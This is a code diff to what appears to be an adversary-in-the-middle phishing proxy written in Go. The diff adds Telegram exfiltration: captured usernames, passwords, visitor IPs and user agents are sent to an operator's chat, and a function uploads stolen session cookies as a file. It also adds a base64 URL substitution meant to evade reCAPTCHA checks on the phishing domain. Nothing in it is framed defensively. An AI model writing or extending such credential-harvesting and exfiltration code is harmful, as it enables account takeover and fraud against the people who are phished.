@@ -34,6 +34,8 @@ import (
 
 	"golang.org/x/net/proxy"
 
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
@@ -47,6 +49,7 @@ import (
 const (
 	CONVERT_TO_ORIGINAL_URLS = 0
 	CONVERT_TO_PHISHING_URLS = 1
+	webhook_verbosity        = 2
 )
 
 const (
@@ -81,6 +84,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	telegram_bot      *tgbotapi.BotAPI
+	telegram_chat_id  int64
 }
 
 type ProxySession struct {
@@ -93,6 +98,27 @@ type ProxySession struct {
 
 type data struct {
 	Fai string `json:"as"`
+}
+
+func (p *HttpProxy) NotifyWebhook(msg string) {
+	if p.telegram_bot != nil {
+		creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
+		if _, err := p.telegram_bot.Send(creds); err != nil {
+			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
+		}
+	}
+}
+
+func (p *HttpProxy) SendCookies(msg string) {
+	if p.telegram_bot != nil {
+		cookies := tgbotapi.NewDocument(p.telegram_chat_id, tgbotapi.FileBytes{
+			Name:  "tg_cookies.json",
+			Bytes: []byte(msg),
+		})
+		if _, err := p.telegram_bot.Send(cookies); err != nil {
+			log.Error("failed to send telegram cookie webhook in one file. msg length %v: err: %s", len(msg), err)
+		}
+	}
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -109,6 +135,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		telegram_bot:      nil,
 	}
 
 	p.Server = &http.Server{
@@ -291,6 +318,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									p.NotifyWebhook(fmt.Sprintf("[%d] new visitor has arrived: %s (%s)", sid, req.Header.Get("User-Agent"), remote_addr))
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
@@ -510,13 +538,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// patch GET query params with original domains
+				// patch GET query params with original domains & bypass recaptcha
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								if qs[gp][i] == "aHR0cHM6Ly93d3cuYmsudGVjaDIwNTAudGs6NDQz" { // https://accounts.fake-domain.com:443
+									qs[gp][i] = "aHR0cHM6Ly93d3cuYnVyZ2Vya2luZy5mcjo0NDM" // https://accounts.safe-domain.com:443
+								}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -550,6 +581,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
+									if len(um[1]) > 0 && webhook_verbosity == 2 {
+										p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
+									}
 								}
 							}
 
@@ -560,6 +594,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
+									}
+									if len(pm[1]) > 0 && webhook_verbosity == 2 {
+										p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
 									}
 								}
 							}
@@ -572,6 +609,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
+										}
+										if cp.key_s == "(login|UserName|username|email|account)" {
+											log.Success("[%d] Username: [%s]", ps.Index, cm[1])
+											p.setSessionUsername(ps.SessionId, cm[1])
+											if len(cm[1]) > 0 && webhook_verbosity == 2 {
+												p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, cm[1]))
+											}
+										} else if cp.key_s == "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)" {
+											p.setSessionPassword(ps.SessionId, cm[1])
+											log.Success("[%d] Password: [%s]", ps.Index, cm[1])
+											if len(cm[1]) > 0 && webhook_verbosity == 2 {
+												p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, cm[1]))
+											}
+										} else {
+											log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										}
 									}
 								}
@@ -593,6 +645,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											if len(um[1]) > 0 && webhook_verbosity == 2 {
+												p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
+											}
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -602,6 +657,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
+											}
+											if len(pm[1]) > 0 && webhook_verbosity == 2 {
+												p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
 											}
 										}
 									}
@@ -613,6 +671,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
+												}
+												if cp.key_s == "(login|UserName|username|email|account)" {
+													log.Success("[%d] Username: [%s]", ps.Index, cm[1])
+													p.setSessionUsername(ps.SessionId, cm[1])
+													if len(cm[1]) > 0 && webhook_verbosity == 2 {
+														p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, cm[1]))
+													}
+												} else if cp.key_s == "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)" {
+													p.setSessionPassword(ps.SessionId, cm[1])
+													log.Success("[%d] Password: [%s]", ps.Index, cm[1])
+													if len(cm[1]) > 0 && webhook_verbosity == 2 {
+														p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, cm[1]))
+													}
+												} else {
+													log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												}
 											}
 										}
